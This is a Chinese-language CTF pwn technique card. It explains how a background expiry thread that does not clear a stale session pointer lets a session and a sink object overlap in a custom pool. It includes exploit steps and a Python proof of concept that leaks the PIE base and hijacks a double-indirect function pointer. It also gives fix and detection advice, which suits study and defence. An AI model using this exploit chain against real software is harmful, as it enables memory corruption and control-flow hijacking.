---
id: ctf-pwn-stale-pool-session-overlap-sink-double-indirect-call
title: 过期回收不清 sessions[] 导致 session/sink 重叠：stale 指针改二级函数指针
type: scenario
domain: ctf
path: ctf/pwn
technique: stale-pool-session-sink-overlap-double-indirect-call
aliases:
- stale session 指针
- 后台过期线程 UAF
- session/sink 重叠
- 二级函数指针
- house of mirage
- pool_free 不复位
tags:
- pwn
- heap
- uaf
- stale-pointer
- custom-pool
- type-confusion
- function-pointer
- double-indirect
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V115
  verified_at: '2026-11-06T01:47:04+08:00'
  notes: 已对照原文 House Of Mirage 核对：后台过期回收 free scratch+pool_free 不清 sessions[i]、填充 0xa5、0x60 池 session/sink 重叠、show 泄 PIE+0x6030、mirror import 写 16 字节冻结 expire_at=0x7fff...、flush 二级间接调用 fn=*(call_ptr)、payload p64(chunk+8)+p64(unlock)、pie=table-0x6030、unlock=pie+0x3970 均一致；原文有实测 flag，未本机复跑。
---

## 一句话结论

后台线程把过期 session 的 chunk 放回程序自研池，却没有把 `sessions[idx]` 置空；随后创建 sink 复用同一块内存，`sessions[idx]` 与 `sinks[idx]` 指向同一 chunk。用 stale session 的 `show`/`mirror import` 泄露 PIE/堆地址并改写重叠区，再把 sink 的二级函数指针 `call_ptr` 指向 `chunk+8`、`*(chunk+8)` 写成隐藏函数，`flush sink` 即触发。

## 原理

- **自研池 + 后台回收**：后台线程遍历 `sessions[i]`，对过期的 `free(sessions[i]->scratch); pool_free(sessions[i]);`，但没有 `sessions[i] = NULL`；释放时还会把 chunk 填 `0xa5`。
- **复用造成重叠**：`create sink` 从同一 0x60 池分配，可能拿到刚回收的 session chunk；于是 `sessions[i]`（stale）和 `sinks[i]`（新对象）指向同一地址。
- **stale session 的读写能力**：`show session` 打印对象第一个 qword（session 的 `table`，正常为 `PIE+0x6030`），用于算 PIE；`mirror import` 往重叠区开头写 16 字节，可改 sink 的字段。
- **二级间接调用**：`flush sink` 不是 `call [chunk]`，而是 `fn = *(uint64_t *)sink->call_ptr; fn(sink, message);`；因此要把 `call_ptr` 指到 chunk 内第二个 qword，并把第二个 qword 写成 `unlock`，即 payload `p64(chunk+8) + p64(unlock)`。
- **时序稳定**：过期线程很勤，普通分次交互可能在 show/import 之间把重叠 chunk 重新填 `0xa5`；把 create/show/import 三个操作排到一次发送，并在 import 时把 `expire_at` 改成极大值 `0x7fffffffffffffff`，防止 worker 再擦除。
- **为什么成立**：释放路径不清外部指针，池分配器不区分对象类型；stale 指针保留下来的读写原语直接作用于新对象，等价于 UAF + 类型混淆。

## 触发条件

- 程序有后台线程/定时器回收过期 session，并放回自研池。
- 回收时只释放内存、不清 `sessions[idx]`。
- session 与 sink 使用同一 size 池，创建 sink 可复用刚释放的 chunk。
- sink 的 flush 使用二级函数指针（`*(void**)call_ptr`）。
- 攻击者能控制过期时间与分配顺序，并能在一次网络发送中安排多个菜单操作。

## 利用步骤

1. 创建 session，记录 id；把过期时间设为 0，等待后台线程回收。
2. 在一次发送中依次执行：创建 sink（复用 chunk）→ show stale session（泄露 table）→ mirror import（进入等待 16 字节输入）。
3. 收到泄露后发送 `p64(0)+p64(0x7fffffffffffffff)`，把重叠对象的 `expire_at` 改成极大值，稳定 chunk。
4. `pie = leaked_table - 0x6030`，`unlock = pie + 0x3970`。
5. 用 telemetry/泄漏接口拿到重叠 chunk 地址。
6. 通过 stale session 的 `mirror import` 写 `p64(chunk+8)+p64(unlock)`。
7. `flush sink`，`fn = *(chunk+8) = unlock`，调用隐藏函数输出 flag。

## PoC

```python
session_id = create_session()
arm_expiry(session_id, 0)
time.sleep(1.2)

# 一次发送：create sink / show stale / import 进入等待
io.send(b"6\nsink\n2\n" + str(session_id).encode() + b"\n3\n" +
        str(session_id).encode() + b"\n16\n")
sink_id = int(io.recvline())
table = int(io.recvline(), 16)

# 冻结 expire_at，防止后台线程再擦 chunk
io.send(p64(0) + p64(0x7FFFFFFFFFFFFFFF))

pie = table - 0x6030
unlock = pie + 0x3970
chunk = leak_chunk(session_id)

import_profile(session_id, p64(chunk + 8) + p64(unlock))
flush(sink_id)
```

原文实测：`table - 0x6030` 得到 PIE，`unlock=pie+0x3970`；payload 写入后 `flush sink` 调用隐藏函数，输出 flag。

## 变体与关联

- **回收变体**：后台线程/定时器/GC 回收、池 free 不清外部指针、释放填充 `0xa5`。
- **重叠变体**：session 与 sink 同 size、池不区分类型、create 复用最近释放 chunk。
- **调用变体**：二级函数指针（`fn=*(call_ptr); fn(obj,msg)`）、虚表、回调表；一级指针直接覆盖可能被校验。
- **时序变体**：把多操作合并发送、用 import 冻结过期时间、堆喷稳定布局。
- **关联卡片**：[[ctf-pwn-custom-freelist-uaf-unchecked-next-arbitrary-alloc-function-table]]（自研池 UAF + 函数表）、[[ctf-pwn-uaf-overlap-fake-note-aar-safe-linking-dynsym-environ-stack-scan]]（UAF 重叠任意读）、[[ctf-pwn-type-confusion-reclassify-adjacent-oob-perform]]（同篇类型混淆）。
- **边界**：若回收时清空 `sessions[idx]`、池按类型隔离、flush 前校验 `call_ptr` 范围，链不成立；后台线程时序不稳定时需重试/冻结。

## 检测与防御

- **CTF 验证**：确认 `sessions[idx] == sinks[idx]`（通过 show/telemetry 读同一地址），再写 payload；flush 后观察隐藏函数输出。
- **代码修复**：`pool_free` 后立即 `sessions[i]=NULL`；池分配器按类型/大小隔离；释放时清零并加 type tag。
- **设计防御**：二级函数指针加载后校验位于可执行段白名单；对象带 magic/size 校验；后台回收与对象创建加锁，避免 UAF。
- **检测信号**：过期 session 仍可 show/import；sink 与 session 地址重叠；flush 时 `call_ptr` 指向对象内部而非函数表；隐藏函数被调用。
